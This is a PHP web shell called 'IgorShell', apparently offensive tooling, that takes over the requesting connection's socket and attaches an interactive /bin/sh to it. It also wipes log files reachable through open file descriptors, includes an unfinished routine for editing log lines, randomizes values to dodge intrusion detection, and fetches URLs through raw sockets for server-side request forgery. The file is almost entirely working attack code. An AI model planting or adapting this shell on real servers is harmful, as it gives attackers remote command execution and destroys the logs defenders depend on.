<?php

/*
 *    IgorShell, findsock php statefull shell with ssrf capabilities.
 *    Author: Captain, Mantis
 *    Date: 05-08-2013
 *    Dependancies: PHP >= 5.3.6
 */

// Disable timing out as we wish to facilitate a statefull shell session.
set_time_limit(0);

// TODO: Set debug info to false when releasing to production.
ini_set('error_reporting', E_ALL);
ini_set('display_errors', true);

class IgorShell {

    private $m_Shell = '/bin/sh';

    private $m_Pid;
    private $m_Nice;
    private $m_FileDescriptors;
    private $m_BossIp;
    private $m_BossPort;
    private $m_BossSock;
    private $m_TimeStart;
    private $m_TimeEnd;


    public function __construct() {
        $this->m_Pid             = getmypid();
        $this->m_Nice            = $this->getProcessNice();
        $this->m_FileDescriptors = array();
        $this->m_BossIp          = $_SERVER['REMOTE_ADDR'];
        $this->m_BossPort        = $_SERVER['REMOTE_PORT'];
        $this->m_TimeStart       = time();
    }

    /**
     *    Fetch current process priority
     *    0 is highest, thus the higher the number
     *    the lower the priority of the process.
     */
    private function getProcessNice ($pid = null) {

        if (!$pid) {
            $pid = $this->m_Pid;
        }

        // Execute ps -p [pid] -o %p %n in shell
        $res = `ps -p $pid -o "%p %n"`;

        // Fetch info we want from output
        preg_match ('/^\s*\w+\s+\w+\s*(\d+)\s+(\d+)/m', $res, $matches);

        // Return Pid and priority
        return array ( 'pid' => (isset ($matches[1]) ? $matches[1] : null), 'nice' => (isset ($matches[2]) ? $matches[2] : null) );
    }

    /**
     *    Method which enumerates all inherited file descriptors
     *    and looks up all relevant info for each.
     *    Dep: PHP >= 5.3.6
     */
    private function getFileDescriptors(  ) {

        $it = new DirectoryIterator("glob:///proc/self/fd/*");
        // $x = `lsof`;
        // $return = array();
        // if($b = preg_split('/(\t|\s)+/', $x)){
        //     $i = 0;
        //     foreach($b as $key => $value){
        //         var_dump($key, $value);
        //     }
        // }
        foreach($it as $f) {

            $tmpArr = array();

            // Create resource from fd
            $tmpArr['fd']    = $fd = fopen("php://fd/" . $f->getFilename(), 'r+');

            // Determine type
            $details         = stream_get_meta_data($fd);
            $tmpArr['type']  = $details['stream_type'];

            // Determine Blocked / Non-Blocked state
            $tmpArr['state'] = $details['blocked'];

            // Determine uri
            $tmpArr['uri']   = $details['uri'];

            // fd mode
            $tmpArr['mode']  = $details['mode'];

            // retrieve filepath
            $tmpArr['filepath'] = readlink('/proc/'.$this->m_Pid.'/fd/'.$f->getFilename());

            // Save
            $this->m_FileDescriptors[ $f->getFilename() ] = $tmpArr;
        }
    }

    public function printFileDescriptors(  ) {
        if(!$this->m_FileDescriptors){
            $this->getFileDescriptors();
        }
        foreach ( $this->m_FileDescriptors as $id => $fd ) {
            echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
        }
        echo "<hr/>".print_r($this->m_FileDescriptors, true).'<br/>';
    }

    public function whipeLog( $fd = null ) {

        // Default fd for log. If NULL ,retrieve logfiles from internal file descripters.
        if( $fd == null ){
            $logfiles = $this->getLogFiles();
        }else{
            $logfiles[] = $fd;
        }
        foreach($logfiles as $key => $props){
            if(!is_resource($props['fd'])) continue;

            // Fetch log size before whiping so we can check if the operation is successfull later on
            $prevSize = strlen( stream_get_contents($props['fd']) );
            if($prevSize !== false){

                // Truncate filesize to 0 & close resource
                if(ftruncate($props['fd'] , 0)){

                    // Fetch current size of data
                    $currentSize = strlen( stream_get_contents($props['fd']) );

                    // Check if current size is smaller then prev size to know the operation was succesfull
                    if($currentSize < $prevSize || $currentSize == false) {
                        echo 'Log is empty: '.$props['filepath'].'!<br/>';
                    } else {
                        echo 'Log whipe failed, looks like your fucked ;)';
                    }
                }
            }

            fclose($props['fd']);
        }
    }

    private function getLogFiles(){
        if(empty($this->m_FileDescriptors)){
            $this->getFileDescriptors();
        }

        foreach($this->m_FileDescriptors as $fd => $props){
            if(preg_match('/((\w)+(\.log))/', $props['filepath'])){
                $logfiles[$fd] = $props;
            }
        }
        return $logfiles;
    }


    /**
     *    Method that reads contents of log file referenced by fd
     *    performs some basic manipulations on the data and
     *    overwrites the log with manipulated version.
     */
    private function editLog( $fd = null ) {
        // TODO: implement me.
        $this->m_TimeEnd = time();
        $timeStart = date('M  d', $this->m_TimeStart);

        $logFileName = ''; // Filename?
        $fh = @fopen($fh, 'r+');
        if(!$fh){
            return false;
        }
        $logResult = '';
        while(($line = fgets($fh)) !== false){
            if(feof($fh)){
                return false;
            }
            if(preg_match('/^([A-Za-z]{1,3}(\s|\t)+[0-9]{1,2}(\t|\s)+[0-9\:]{0,3}+)(.?*)$/', $line, $matches)){
                $dateTime = $matches[1];

                // Added in the strtolower just for extra checks - Want to be safe if we are editing logs
                if(strtolower($dateTime) == strtolower(substr($line, 0, (strlen($dateTime)-1)))){
                    $line = '';
                }
            }
            $logResult .= $line;
        }
        @fwrite($fh, $logResult);
        @fclose($fh);
        return;
    }

    /**
     *    Findsock method iterates over socket descriptors found
     *    untill it's found the requesting socket.
     */
    public function findSock() {
        if(!$this->m_FileDescriptors){
            $this->getFileDescriptors();
        }
        if(!empty($this->m_FileDescriptors)){
            foreach( $this->m_FileDescriptors as $id => $d ) {

                // Skip if fd is not a socket
                if( $d['type'] != 'tcp_socket' ){
                    continue;
                }

                $remote = stream_socket_get_name($d['fd'], true);
                if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {

                    // Sock found!
                    $this->m_BossSock = $d['fd'];

                    if( is_resource($this->m_BossSock) )
                        echo 'Found socket!\n';
                    else
                        die('weird...');
                    return;
                }
            }
        }
    }

    public function hookShell($socketResource = null) {

        // Check if sock has been found
        if( !is_resource($this->m_BossSock) ){
            $this->findSock();
        }

        // Disable blocking for socket stream
        socket_set_nonblock($this->m_BossSock);

        // Close control pipes
        $p1 = fopen('php://fd/4', 'w');
        $p2 = fopen('php://fd/5', 'w');
        ftruncate($p1, 0);
        ftruncate($p2, 0);
        fclose($p2);
        fclose($p1);

        // Prepare io pipes
        $io = array(
                0 => $this->m_BossSock,
                1 => $this->m_BossSock,
                2 => $this->m_BossSock
            );

        // Set process as leading session.
        posix_setsid ();

        // Spawn shell process and attach pipes
        $proc = proc_open(  $this->m_Shell,
                            $io,
                            $pipes
                        );

        // Check if process spawned successfully
        if( !is_resource($proc) )
            die('Failed to spawn shell process');

        // Main loop
        while( is_resource($this->m_BossSock) ) {

            // Fetch proc and sock states
            $procState = proc_get_status($proc);

            // Check if either one is dead
            if( $procState['running'] === false ) {

                // Clean up
                fflush($this->m_BossSock);
                fclose($this->m_BossSock);
                proc_close($proc);
            }

            sleep(1000);
        }
    }

    public function evadeIDS($arg, $count = false){
        switch(strtolower(gettype($arg))){
            case 'string':
                $strlen = strlen($arg);
                // 255 - strlen to ensure it will work on most/all varchar fields
                $arg = $this->randCode(rand(0, (255-$strlen)));
                break;

            case 'boolean':
            case 'integer':
            default:
                $arg = rand(1, 32);
                break;
        }
        return $arg;
    }

    public function getRemoteFile($host, $directory, $filename, &$errstr, &$errno, $port=80, $timeout=10) {
        $fsock = fsockopen($host, $port, $errno, $errstr, $timeout);
        if($fsock) {
            @fputs($fsock, 'GET '.$directory.'/'.$filename.' HTTP/1.1'."\r\n");
            @fputs($fsock, 'HOST: '.$host."\r\n");
            @fputs($fsock, 'Connection: close'."\r\n\r\n");

            $file_info = '';
            $get_info = false;

            while(!feof($fsock)) {
                if($get_info) {
                    $file_info .= fread($fsock, 1024);
                } else {
                    $line = fgets($fsock, 1024);
                    if($line == "\r\n") {
                        $get_info = true;
                    } else {
                        if(stripos($line, '404 not found') !== false) {
                            $errstr = 'Error 404: '.$filename;
                            return false;
                        }
                    }
                }
            }
            fclose($fsock);
        } else {
            if($errstr) {
                return false;
            } else {
                $errstr = 'fsockopen is disabled.';
                return false;
            }
        }

        return $file_info;
    }

    protected function strnstr($haystack, $needle, $nth){
        $max = strlen($haystack);
        $n = 0;
        for( $i=0; $i < $max; $i++ ){
            if( $haystack[$i] == $needle ){
                $n++;
                if( $n >= $nth ){
                    break;
                }
            }
        }
        $arr[] = substr($haystack, 0, $i);

        return $arr[0];
    }

    protected function randCode($maxLength=6){
        $password = NULL;
        $possible = 'bcdfghjkmnrstvwxyz123456789';
        $i = 0;
        while(($i < $maxLength) && (strlen($possible) > 0)){
            $i++;
            $character = substr($possible, mt_rand(0, strlen($possible)-1), 1);
            $password .= $character;
        }
        return $password;
    }
}

$is = new IgorShell();
$is->hookShell();
